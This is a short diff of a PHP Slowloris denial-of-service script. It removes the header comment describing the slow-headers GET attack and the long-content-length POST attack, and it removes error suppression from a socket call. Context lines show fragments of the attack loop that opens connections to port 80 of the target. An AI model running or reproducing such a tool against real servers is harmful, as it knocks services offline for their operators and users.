@@ -1,11 +1,6 @@
 #! /usr/bin/env php
+
 <?php
-/* PHP Slowloris
- * Adapted from the script found here: http://seclists.org/fulldisclosure/2009/Jun/207
- * Contains get based attack (slow headers) and post based attack (long content length)
- * 
- * Author: Seppe vanden Broucke
- */
 
 function usage($argv)
 {
@@ -23,7 +18,7 @@ function attack_get($server, $host)
     $request .= "Accept: *.*\r\n";
     $request .= "X-a: " . rand(1, 10000) . "\r\n";
 
-    $sockfd = @fsockopen($server, 80, $errno, $errstr);
+    $sockfd = fsockopen($server, 80, $errno, $errstr);
     @fwrite($sockfd, $request);
 
     while (true) {
